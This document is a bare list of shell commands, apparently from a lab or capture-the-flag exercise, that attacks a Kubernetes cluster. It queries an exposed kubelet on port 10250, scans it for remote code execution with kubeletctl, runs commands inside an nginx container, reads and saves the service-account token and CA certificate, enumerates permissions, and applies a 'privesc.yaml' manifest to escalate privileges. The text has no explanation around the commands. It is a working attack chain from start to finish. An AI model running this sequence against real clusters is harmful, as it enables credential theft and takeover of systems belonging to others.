
```
curl https://10.129.10.11:6443 -k
```

```
curl https://10.129.10.11:10250/pods -k | jq .
```

```
kubeletctl -i --server 10.129.10.11 pods
```

```
kubeletctl -i --server 10.129.10.11 scan rce

```

```
kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

```

```
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```

```
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

```
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```

```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```

```
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```